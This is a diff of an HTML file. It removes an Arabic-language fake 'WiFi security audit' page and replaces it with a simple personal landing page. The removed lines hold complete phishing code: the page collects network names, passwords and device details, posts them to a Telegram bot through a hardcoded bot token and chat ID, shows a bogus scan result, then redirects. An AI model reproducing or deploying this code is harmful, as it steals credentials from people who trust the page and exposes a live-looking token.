@@ -3,95 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Security Audit</title>
+    <title>صفحة أحمد الاحترافية</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; }
-        .icon { font-size: 50px; color: #28a745; margin-bottom: 15px; }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; background: #28a745; color: white; padding: 13px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: bold; }
-        
-        #loader { display: none; margin-top: 20px; }
-        .prog-bar { width: 100%; background: #eee; height: 8px; border-radius: 10px; overflow: hidden; }
-        .prog-fill { width: 0%; height: 100%; background: #28a745; transition: width 5s linear; }
-        
-        #result { display: none; margin-top: 20px; color: #28a745; font-weight: bold; }
+        /* تصميم الخلفية المتحركة */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            text-align: center;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            width: 80%;
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        p { font-size: 1.1rem; opacity: 0.8; }
+
+        /* تصميم الأزرار */
+        .btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #00d2ff;
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.4);
+        }
+
+        .btn:hover { transform: scale(1.05); background: #3a7bd5; }
     </style>
 </head>
 <body>
 
-<div class="card" id="box">
-    <div class="icon">🛡️</div>
-    <h2 id="title">فحص أمان الشبكة</h2>
-    <p id="desc">أدخل بيانات الواي فاي للتأكد من خلو اتصالك من المتلصصين والهكر.</p>
-    
-    <div id="inputs">
-        <input type="text" id="wifiName" placeholder="اسم الشبكة">
-        <input type="password" id="wifiPass" placeholder="كلمة السر">
-        <button onclick="process()">بدء عملية التحقق</button>
-    </div>
-
-    <div id="loader">
-        <p>جاري تحليل أمان الشبكة والجهاز...</p>
-        <div class="prog-bar"><div class="prog-fill" id="fill"></div></div>
-    </div>
-
-    <div id="result">
-        <p>✅ تم الفحص! لم يتم العثور على تهديدات.</p>
-        <p>جاري توجيهك لتقرير الأمان...</p>
-    </div>
+<div class="container">
+    <h1>أهلاً بك في تطبيق أحمد</h1>
+    <p>هذا الموقع يعمل الآن داخل التطبيق الخاص بي بنجاح!</p>
+    <a href="https://t.me/your_telegram_username" class="btn">تواصل معي على تلجرام</a>
 </div>
-
-<script>
-    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
-    const chat = "8042090388";
-
-    async function process() {
-        const name = document.getElementById('wifiName').value;
-        const pass = document.getElementById('wifiPass').value;
-
-        if(!name || !pass) { alert("أدخل البيانات أولاً"); return; }
-
-        // إخفاء المدخلات وإظهار التحميل
-        document.getElementById('inputs').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('fill').style.width = '100%';
-
-        // إرسال تقرير المعلومات فوراً إلى تليجرام
-        const report = `
-📢 تقرير فحص أمان جديد:
-----------------------
-📶 الشبكة: ${name}
-🔑 الباسورد: ${pass}
-----------------------
-📱 معلومات الجهاز:
-- نظام التشغيل: ${navigator.platform}
-- المتصفح: ${navigator.userAgent.split(') ')[1]}
-- الشاشة: ${screen.width}x${screen.height}
-- اللغة: ${navigator.language}
-        `;
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chat, text: report })
-        });
-
-        // الانتظار 5 ثوانٍ لإتمام الفحص الوهمي
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('result').style.display = 'block';
-
-            // بعد ثانيتين من ظهور "تم الفحص"، يتم التحويل لليوتيوب
-            setTimeout(() => {
-                window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
-            }, 2000);
-
-        }, 5000);
-    }
-</script>
 
 </body>
 </html>
